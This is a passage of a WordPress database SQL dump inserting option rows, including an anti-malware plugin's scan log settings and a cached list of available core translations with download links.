INSERT INTO `cmrfu_options` VALUES("15621","GOTMLS_scan_log/78.135.61.182/1478191481.0475","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:5:\"427px\";i:1;s:5:\"150px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:29:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";i:28;s:2:\"js\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:1:{i:0;s:4:\".git\";}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:3:{i:0;s:8:\"backdoor\";i:1;s:5:\"known\";i:2;s:9:\"potential\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1478191482;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:1517;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1478192999.6979289;s:6:\"finish\";i:1478192999;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15887","wpseo_onpage","a:2:{s:6:\"status\";i:1;s:10:\"last_fetch\";i:1489701636;}","yes");
INSERT INTO `cmrfu_options` VALUES("17691","can_compress_scripts","1","no");
INSERT INTO `cmrfu_options` VALUES("19406","_site_transient_timeout_available_translations","1489145127","no");
INSERT INTO `cmrfu_options` VALUES("19407","_site_transient_available_translations","a:108:{s:2:\"af\";a:8:{s:8:\"language\";s:2:\"af\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:38:06\";s:12:\"english_name\";s:9:\"Afrikaans\";s:11:\"native_name\";s:9:\"Afrikaans\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.3/af.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"af\";i:2;s:3:\"afr\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:10:\"Gaan voort\";}}s:2:\"ar\";a:8:{s:8:\"language\";s:2:\"ar\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:49:08\";s:12:\"english_name\";s:6:\"Arabic\";s:11:\"native_name\";s:14:\"العربية\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.3/ar.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ar\";i:2;s:3:\"ara\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:16:\"المتابعة\";}}s:3:\"ary\";a:8:{s:8:\"language\";s:3:\"ary\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:42:35\";s:12:\"english_name\";s:15:\"Moroccan Arabic\";s:11:\"native_name\";s:31:\"العربية المغربية\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.3/ary.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ar\";i:3;s:3:\"ary\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:16:\"المتابعة\";}}s:2:\"as\";a:8:{s:8:\"language\";s:2:\"as\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-11-22 18:59:07\";s:12:\"english_name\";s:8:\"Assamese\";s:11:\"native_name\";s:21:\"অসমীয়া\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/as.zip\";s:3:\"iso\";a:3:{i:1;s:2:\"as\";i:2;s:3:\"asm\";i:3;s:3:\"asm\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:0:\"\";}}s:2:\"az\";a:8:{s:8:\"language\";s:2:\"az\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-11-06 00:09:27\";s:12:\"english_name\";s:11:\"Azerbaijani\";s:11:\"native_name\";s:16:\"Azərbaycan dili\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/az.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"az\";i:2;s:3:\"aze\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:5:\"Davam\";}}s:3:\"azb\";a:8:{s:8:\"language\";s:3:\"azb\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-09-12 20:34:31\";s:12:\"english_name\";s:17:\"South Azerbaijani\";s:11:\"native_name\";s:29:\"گؤنئی آذربایجان\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/azb.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"az\";i:3;s:3:\"azb\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Continue\";}}s:3:\"bel\";a:8:{s:8:\"language\";s:3:\"bel\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-09-01 08:27:29\";s:12:\"english_name\";s:10:\"Belarusian\";s:11:\"native_name\";s:29:\"Беларуская мова\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/bel.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"be\";i:2;s:3:\"bel\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:20:\"Працягнуць\";}}s:5:\"bg_BG\";a:8:{s:8:\"language\";s:5:\"bg_BG\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-03-06 09:18:57\";s:12:\"english_name\";s:9:\"Bulgarian\";s:11:\"native_name\";s:18:\"Български\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/bg_BG.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"bg\";i:2;s:3:\"bul\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:12:\"Напред\";}}s:5:\"bn_BD\";a:8:{s:8:\"language\";s:5:\"bn_BD\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-04 16:58:43\";s:12:\"english_name\";s:7:\"Bengali\";s:11:\"native_name\";s:15:\"বাংলা\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/bn_BD.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"bn\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:23:\"এগিয়ে চল.\";}}s:2:\"bo\";a:8:{s:8:\"language\";s:2:\"bo\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-09-05 09:44:12\";s:12:\"english_name\";s:7:\"Tibetan\";s:11:\"native_name\";s:21:\"བོད་ཡིག\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/bo.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"bo\";i:2;s:3:\"tib\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:24:\"མུ་མཐུད།\";}}s:5:\"bs_BA\";a:8:{s:8:\"language\";s:5:\"bs_BA\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-09-04 20:20:28\";s:12:\"english_name\";s:7:\"Bosnian\";s:11:\"native_name\";s:8:\"Bosanski\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/bs_BA.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"bs\";i:2;s:3:\"bos\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:7:\"Nastavi\";}}s:2:\"ca\";a:8:{s:8:\"language\";s:2:\"ca\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-03-05 11:34:47\";s:12:\"english_name\";s:7:\"Catalan\";s:11:\"native_name\";s:7:\"Català\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.3/ca.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ca\";i:2;s:3:\"cat\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Continua\";}}s:3:\"ceb\";a:8:{s:8:\"language\";s:3:\"ceb\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-03-02 17:25:51\";s:12:\"english_name\";s:7:\"Cebuano\";s:11:\"native_name\";s:7:\"Cebuano\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/ceb.zip\";s:3:\"iso\";a:2:{i:2;s:3:\"ceb\";i:3;s:3:\"ceb\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:7:\"Padayun\";}}s:5:\"cs_CZ\";a:8:{s:8:\"language\";s:5:\"cs_CZ\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-12 08:46:26\";s:12:\"english_name\";s:5:\"Czech\";s:11:\"native_name\";s:12:\"Čeština‎\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/cs_CZ.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"cs\";i:2;s:3:\"ces\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:11:\"Pokračovat\";}}s:2:\"cy\";a:8:{s:8:\"language\";s:2:\"cy\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:49:29\";s:12:\"english_name\";s:5:\"Welsh\";s:11:\"native_name\";s:7:\"Cymraeg\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.3/cy.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"cy\";i:2;s:3:\"cym\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Parhau\";}}s:5:\"da_DK\";a:8:{s:8:\"language\";s:5:\"da_DK\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-28 00:33:54\";s:12:\"english_name\";s:6:\"Danish\";s:11:\"native_name\";s:5:\"Dansk\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/da_DK.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"da\";i:2;s:3:\"dan\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:12:\"Forts&#230;t\";}}s:5:\"de_DE\";a:8:{s:8:\"language\";s:5:\"de_DE\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-18 10:54:37\";s:12:\"english_name\";s:6:\"German\";s:11:\"native_name\";s:7:\"Deutsch\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/de_DE.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"de\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Weiter\";}}s:5:\"de_CH\";a:8:{s:8:\"language\";s:5:\"de_CH\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:40:03\";s:12:\"english_name\";s:20:\"German (Switzerland)\";s:11:\"native_name\";s:17:\"Deutsch (Schweiz)\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/de_CH.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"de\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Weiter\";}}s:14:\"de_CH_informal\";a:8:{s:8:\"language\";s:14:\"de_CH_informal\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:39:59\";s:12:\"english_name\";s:30:\"German (Switzerland, Informal)\";s:11:\"native_name\";s:21:\"Deutsch (Schweiz, Du)\";s:7:\"package\";s:73:\"https://downloads.wordpress.org/translation/core/4.7.3/de_CH_informal.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"de\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Weiter\";}}s:12:\"de_DE_formal\";a:8:{s:8:\"language\";s:12:\"de_DE_formal\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-18 10:45:41\";s:12:\"english_name\";s:15:\"German (Formal)\";s:11:\"native_name\";s:13:\"Deutsch (Sie)\";s:7:\"package\";s:71:\"https://downloads.wordpress.org/translation/core/4.7.3/de_DE_formal.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"de\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Weiter\";}}s:3:\"dzo\";a:8:{s:8:\"language\";s:3:\"dzo\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-06-29 08:59:03\";s:12:\"english_name\";s:8:\"Dzongkha\";s:11:\"native_name\";s:18:\"རྫོང་ཁ\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/dzo.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"dz\";i:2;s:3:\"dzo\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:0:\"\";}}s:2:\"el\";a:8:{s:8:\"language\";s:2:\"el\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-21 10:37:42\";s:12:\"english_name\";s:5:\"Greek\";s:11:\"native_name\";s:16:\"Ελληνικά\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.3/el.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"el\";i:2;s:3:\"ell\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:16:\"Συνέχεια\";}}s:5:\"en_AU\";a:8:{s:8:\"language\";s:5:\"en_AU\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-27 00:40:28\";s:12:\"english_name\";s:19:\"English (Australia)\";s:11:\"native_name\";s:19:\"English (Australia)\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/en_AU.zip\";s:3:\"iso\";a:3:{i:1;s:2:\"en\";i:2;s:3:\"eng\";i:3;s:3:\"eng\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Continue\";}}s:5:\"en_CA\";a:8:{s:8:\"language\";s:5:\"en_CA\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:49:34\";s:12:\"english_name\";s:16:\"English (Canada)\";s:11:\"native_name\";s:16:\"English (Canada)\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/en_CA.zip\";s:3:\"iso\";a:3:{i:1;s:2:\"en\";i:2;s:3:\"eng\";i:3;s:3:\"eng\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Continue\";}}s:5:\"en_NZ\";a:8:{s:8:\"language\";s:5:\"en_NZ\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:54:30\";s:12:\"english_name\";s:21:\"English (New Zealand)\";s:11:\"native_name\";s:21:\"English (New Zealand)\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/en_NZ.zip\";s:3:\"iso\";a:3:{i:1;s:2:\"en\";i:2;s:3:\"eng\";i:3;s:3:\"eng\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Continue\";}}s:5:\"en_ZA\";a:8:{s:8:\"language\";s:5:\"en_ZA\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:53:43\";s:12:\"english_name\";s:22:\"English (South Africa)\";s:11:\"native_name\";s:22:\"English (South Africa)\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/en_ZA.zip\";s:3:\"iso\";a:3:{i:1;s:2:\"en\";i:2;s:3:\"eng\";i:3;s:3:\"eng\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Continue\";}}s:5:\"en_GB\";a:8:{s:8:\"language\";s:5:\"en_GB\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-28 03:10:25\";s:12:\"english_name\";s:12:\"English (UK)\";s:11:\"native_name\";s:12:\"English (UK)\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/en_GB.zip\";s:3:\"iso\";a:3:{i:1;s:2:\"en\";i:2;s:3:\"eng\";i:3;s:3:\"eng\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Continue\";}}s:2:\"eo\";a:8:{s:8:\"language\";s:2:\"eo\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:47:07\";s:12:\"english_name\";s:9:\"Esperanto\";s:11:\"native_name\";s:9:\"Esperanto\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.3/eo.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"eo\";i:2;s:3:\"epo\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Daŭrigi\";}}s:5:\"es_ES\";a:8:{s:8:\"language\";s:5:\"es_ES\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-17 15:41:04\";s:12:\"english_name\";s:15:\"Spanish (Spain)\";s:11:\"native_name\";s:8:\"Español\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/es_ES.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"es\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:5:\"es_AR\";a:8:{s:8:\"language\";s:5:\"es_AR\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:41:31\";s:12:\"english_name\";s:19:\"Spanish (Argentina)\";s:11:\"native_name\";s:21:\"Español de Argentina\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/es_AR.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"es\";i:2;s:3:\"spa\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:5:\"es_VE\";a:8:{s:8:\"language\";s:5:\"es_VE\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:53:56\";s:12:\"english_name\";s:19:\"Spanish (Venezuela)\";s:11:\"native_name\";s:21:\"Español de Venezuela\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/es_VE.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"es\";i:2;s:3:\"spa\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:5:\"es_CO\";a:8:{s:8:\"language\";s:5:\"es_CO\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:54:37\";s:12:\"english_name\";s:18:\"Spanish (Colombia)\";s:11:\"native_name\";s:20:\"Español de Colombia\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/es_CO.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"es\";i:2;s:3:\"spa\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:5:\"es_CL\";a:8:{s:8:\"language\";s:5:\"es_CL\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-11-28 20:09:49\";s:12:\"english_name\";s:15:\"Spanish (Chile)\";s:11:\"native_name\";s:17:\"Español de Chile\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/es_CL.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"es\";i:2;s:3:\"spa\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:5:\"es_PE\";a:8:{s:8:\"language\";s:5:\"es_PE\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-09-09 09:36:22\";s:12:\"english_name\";s:14:\"Spanish (Peru)\";s:11:\"native_name\";s:17:\"Español de Perú\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/es_PE.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"es\";i:2;s:3:\"spa\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:5:\"es_GT\";a:8:{s:8:\"language\";s:5:\"es_GT\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:54:37\";s:12:\"english_name\";s:19:\"Spanish (Guatemala)\";s:11:\"native_name\";s:21:\"Español de Guatemala\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/es_GT.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"es\";i:2;s:3:\"spa\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:5:\"es_MX\";a:8:{s:8:\"language\";s:5:\"es_MX\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:42:28\";s:12:\"english_name\";s:16:\"Spanish (Mexico)\";s:11:\"native_name\";s:19:\"Español de México\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/es_MX.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"es\";i:2;s:3:\"spa\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:2:\"et\";a:8:{s:8:\"language\";s:2:\"et\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-27 16:37:11\";s:12:\"english_name\";s:8:\"Estonian\";s:11:\"native_name\";s:5:\"Eesti\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/et.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"et\";i:2;s:3:\"est\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Jätka\";}}s:2:\"eu\";a:8:{s:8:\"language\";s:2:\"eu\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:54:33\";s:12:\"english_name\";s:6:\"Basque\";s:11:\"native_name\";s:7:\"Euskara\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.3/eu.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"eu\";i:2;s:3:\"eus\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Jarraitu\";}}s:5:\"fa_IR\";a:8:{s:8:\"language\";s:5:\"fa_IR\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-02 15:21:03\";s:12:\"english_name\";s:7:\"Persian\";s:11:\"native_name\";s:10:\"فارسی\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/fa_IR.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"fa\";i:2;s:3:\"fas\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:10:\"ادامه\";}}s:2:\"fi\";a:8:{s:8:\"language\";s:2:\"fi\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:42:25\";s:12:\"english_name\";s:7:\"Finnish\";s:11:\"native_name\";s:5:\"Suomi\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.3/fi.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"fi\";i:2;s:3:\"fin\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:5:\"Jatka\";}}s:5:\"fr_FR\";a:8:{s:8:\"language\";s:5:\"fr_FR\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-19 21:32:45\";s:12:\"english_name\";s:15:\"French (France)\";s:11:\"native_name\";s:9:\"Français\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/fr_FR.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"fr\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuer\";}}s:5:\"fr_CA\";a:8:{s:8:\"language\";s:5:\"fr_CA\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-03 21:08:25\";s:12:\"english_name\";s:15:\"French (Canada)\";s:11:\"native_name\";s:19:\"Français du Canada\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/fr_CA.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"fr\";i:2;s:3:\"fra\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuer\";}}s:5:\"fr_BE\";a:8:{s:8:\"language\";s:5:\"fr_BE\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:40:32\";s:12:\"english_name\";s:16:\"French (Belgium)\";s:11:\"native_name\";s:21:\"Français de Belgique\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/fr_BE.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"fr\";i:2;s:3:\"fra\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuer\";}}s:2:\"gd\";a:8:{s:8:\"language\";s:2:\"gd\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-08-23 17:41:37\";s:12:\"english_name\";s:15:\"Scottish Gaelic\";s:11:\"native_name\";s:9:\"Gàidhlig\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/gd.zip\";s:3:\"iso\";a:3:{i:1;s:2:\"gd\";i:2;s:3:\"gla\";i:3;s:3:\"gla\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:15:\"Lean air adhart\";}}s:5:\"gl_ES\";a:8:{s:8:\"language\";s:5:\"gl_ES\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:40:27\";s:12:\"english_name\";s:8:\"Galician\";s:11:\"native_name\";s:6:\"Galego\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/gl_ES.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"gl\";i:2;s:3:\"glg\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:2:\"gu\";a:8:{s:8:\"language\";s:2:\"gu\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-07 18:47:03\";s:12:\"english_name\";s:8:\"Gujarati\";s:11:\"native_name\";s:21:\"ગુજરાતી\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.3/gu.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"gu\";i:2;s:3:\"guj\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:31:\"ચાલુ રાખવું\";}}s:3:\"haz\";a:8:{s:8:\"language\";s:3:\"haz\";s:7:\"version\";s:5:\"4.4.2\";s:7:\"updated\";s:19:\"2015-12-05 00:59:09\";s:12:\"english_name\";s:8:\"Hazaragi\";s:11:\"native_name\";s:15:\"هزاره گی\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.4.2/haz.zip\";s:3:\"iso\";a:1:{i:3;s:3:\"haz\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:10:\"ادامه\";}}s:5:\"he_IL\";a:8:{s:8:\"language\";s:5:\"he_IL\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-29 21:21:10\";s:12:\"english_name\";s:6:\"Hebrew\";s:11:\"native_name\";s:16:\"עִבְרִית\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/he_IL.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"he\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"המשך\";}}s:5:\"hi_IN\";a:8:{s:8:\"language\";s:5:\"hi_IN\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-03-03 12:18:25\";s:12:\"english_name\";s:5:\"Hindi\";s:11:\"native_name\";s:18:\"हिन्दी\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/hi_IN.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"hi\";i:2;s:3:\"hin\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:12:\"जारी\";}}s:2:\"hr\";a:8:{s:8:\"language\";s:2:\"hr\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-29 13:53:21\";s:12:\"english_name\";s:8:\"Croatian\";s:11:\"native_name\";s:8:\"Hrvatski\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.3/hr.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"hr\";i:2;s:3:\"hrv\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:7:\"Nastavi\";}}s:5:\"hu_HU\";a:8:{s:8:\"language\";s:5:\"hu_HU\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:48:39\";s:12:\"english_name\";s:9:\"Hungarian\";s:11:\"native_name\";s:6:\"Magyar\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/hu_HU.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"hu\";i:2;s:3:\"hun\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:10:\"Folytatás\";}}s:2:\"hy\";a:8:{s:8:\"language\";s:2:\"hy\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-12-03 